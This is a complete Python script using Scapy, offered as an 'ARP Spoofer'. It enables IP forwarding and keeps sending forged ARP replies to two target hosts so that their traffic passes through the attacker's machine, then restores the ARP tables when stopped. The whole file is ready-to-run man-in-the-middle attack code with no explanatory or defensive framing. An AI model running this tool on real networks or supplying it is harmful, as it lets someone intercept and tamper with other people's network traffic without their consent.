import os
import sys
from scapy.all import *
import time
from argparse import ArgumentParser

def forwarding(forward=False):
    if forward == True:
        try:
            os.system("sysctl -w net.ipv4.ip_forward=1")
            print("IP Forwarding Enabled")
        except:
            print("Enable IP forwarding failed")
    else:
        try:
            os.system("sysctl -w net.ipv4.ip_forward=0")
            print("IP Forwarding Disabled")
        except:
            print("Disable IP forwarding failed")


def get_mac(ip_address):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address), timeout=5, verbose=False)
    if ans:
        return ans[0][1].src
    else:
        return None
        print(f"Couldn't resolve MAC address of {ip_address}")


def self_mac(ip_address):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address),timeout=5, verbose=False)
    if ans:
        return ans[0][0].src
    else:
        return None
        print(f"Couldn't resolve self MAC address")


def store_macs():
    macs = {"first_mac": None, "second_mac": None}
    first_target_mac = get_mac(first_target)
    second_target_mac = get_mac(second_target)
    self_interface_mac = self_mac(first_target) # ip addy here doesn't matter just need our own mac
    if first_target_mac:
        macs.update(first_mac=first_target_mac)
        print(f"MAC address for {first_target}: {first_target_mac}")
    else:
        print(f"Couldn't resolve MAC address for: {first_target}")
    if second_target_mac:
        macs.update(second_mac=second_target_mac)
        print(f"MAC address for {second_target}: {second_target_mac}")
    else:
        print(f"Couldn't resolve MAC address for: {second_target}")
    if self_interface_mac:
        macs.update(self_mac=self_interface_mac)
        print(f"MAC address for Self: {self_interface_mac}")
    return macs


def end_spoof(first_target, first_target_mac, second_target, second_target_mac):
    print("\nEnding and cleaning up ARP tables ...")
    send(ARP(hwdst="ff:ff:ff:ff:ff:ff", pdst=first_target, hwsrc=second_target_mac,
             psrc=second_target, op=2), count=1, verbose=False)
    send(ARP(hwdst="ff:ff:ff:ff:ff:ff", pdst=second_target, hwsrc=first_target_mac,
             psrc=first_target, op=2), count=1, verbose=False)
    print(f"Tell {first_target} {second_target} is at {second_target_mac}")
    print(f"Tell {second_target} {first_target} is at {first_target_mac}")
    forwarding(forward=False)


def start_spoof(first_target, first_target_mac, second_target, second_target_mac, self_mac):
    forwarding(forward=True)
    print("Starting ...")
    print("CTRL+C To Stop\n")
    try:
        while True:
            send(ARP(hwdst="ff:ff:ff:ff:ff:ff", pdst=first_target, hwsrc=self_mac,
                     psrc=second_target, op=2), count=1, verbose=False)
            print(f"Tell {first_target} {second_target} is at {self_mac}")
            send(ARP(hwdst="ff:ff:ff:ff:ff:ff", pdst=second_target, hwsrc=self_mac,
                     psrc=first_target, op=2), count=1, verbose=False)
            print(f"Tell {second_target} {first_target} is at {self_mac}")
            time.sleep(3)
    except KeyboardInterrupt:
        end_spoof(first_target, first_target_mac, second_target, second_target_mac)
        print("Done ...")

def splitter_args():
    parser = ArgumentParser(description="ARP Spoofer")
    parser.add_argument('-f', '--first', action='store', dest='first_target')
    parser.add_argument('-s', '--second', action='store', dest='second_target')
    args = parser.parse_args()
    return args

args = splitter_args()
if args.first_target and args.second_target:
    first_target = args.first_target
    second_target = args.second_target
    mac = store_macs()
    start_spoof(first_target, mac['first_mac'], second_target, mac['second_mac'], mac['self_mac'])
else:
    print("-h or --help for help")
